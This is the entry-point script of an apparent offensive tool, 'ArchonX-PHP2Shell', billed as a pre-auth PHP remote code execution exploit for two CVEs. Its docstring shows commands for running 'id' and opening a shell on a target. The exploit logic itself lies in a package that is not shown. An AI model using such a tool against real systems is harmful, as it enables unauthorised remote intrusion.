#!/usr/bin/env python3
"""ArchonX-PHP2Shell — main entry point.

ArchonX_DeadLock_Security
Pre-auth PHP RCE for CVE-2026-109618 / CVE-2026-109619.

Usage:
    python run.py --help
    python run.py -t http://127.0.0.1:18110/index.php --recon-only
    python run.py -t http://127.0.0.1:18110/index.php --cmd "id"
    python run.py -t http://127.0.0.1:18110/index.php --shell

Authorized security testing only.
"""
import sys

try:
    from archonx.cli import main
except ImportError as exc:
    sys.stderr.write(
        f"archonx package is incomplete — {exc}\n"
        "Ensure the archonx/ directory is present next to run.py.\n"
    )
    sys.exit(3)


if __name__ == "__main__":
    sys.exit(main())
